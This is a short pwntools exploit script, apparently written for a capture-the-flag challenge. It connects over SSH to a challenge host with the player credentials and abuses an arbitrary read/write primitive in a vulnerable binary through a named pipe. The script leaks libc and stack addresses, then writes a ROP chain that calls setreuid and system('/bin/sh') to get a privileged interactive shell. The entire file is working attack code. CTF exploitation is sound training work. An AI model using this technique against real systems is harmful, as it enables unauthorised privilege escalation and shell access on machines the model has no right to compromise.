#!/bin/env python3

from os import mkfifo
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

fifo = Path('/tmp/pwn')

# p = elf.process([fifo.as_posix()])

# s = ssh(host='instance.pwnme.fr', port=49192,
#         user='player', password='pwnme-2600')
s = ssh(host="localhost", port=7006, user="player", password="pwnme-2600")
s.download('/lib64/ld-linux-x86-64.so.2', 'libc.so.6')
s.download('./vuln', './vuln')

context.binary = elf = ELF('vuln')
libc = ELF('libc.so.6')

s.mkfifo(fifo.as_posix())

p = s.process(['./vuln', fifo.as_posix()])

fifoManager = s.process(['python3'])

# with sf.open(mode="w") as f:
fifoManager.sendline(b'f = open("' + fifo.as_posix().encode() + b'", \'wb\')')

#     f.write(pack(0) + pack(elf.got.printf) + pack(8))
#     f.flush()
fifoManager.sendline(
    b'f.write(' + str(pack(0) + pack(elf.got.printf) + pack(8)).encode() + b')'
)
fifoManager.sendline(b'f.flush()')

libc.address = unpack(p.recv(8)) - libc.symbols.printf
info('libc.address: ' + hex(libc.address))

#     f.write(pack(0) + pack(libc.symbols['_environ']) + pack(8))
#     f.flush()
fifoManager.sendline(
    b'f.write(' + str(pack(0) +
                      pack(libc.symbols['_environ']) + pack(8)).encode() + b')'
)
fifoManager.sendline(b'f.flush()')

_environ = unpack(p.recv(8))
info('_environ: ' + hex(_environ))

rop_obj = ROP(libc)
for _ in range(0x20):
    rop_obj.raw(rop_obj.ret)
rop_obj.setreuid(101, 101)
rop_obj.system(next(libc.search(b'/bin/sh\0')))

rop = rop_obj.chain()

#     f.write(pack(1) + pack(_environ - 0x128) + pack(len(rop)))
#     f.write(rop)
#     f.flush()
fifoManager.sendline(
    b'f.write(' + str(pack(1) + pack(_environ - 0x128) +
                      pack(len(rop))).encode() + b')'
)
fifoManager.sendline(
    b'f.write(' + str(rop).encode() + b')'
)
fifoManager.sendline(b'f.flush()')


s.rm(fifo.as_posix())

p.interactive()
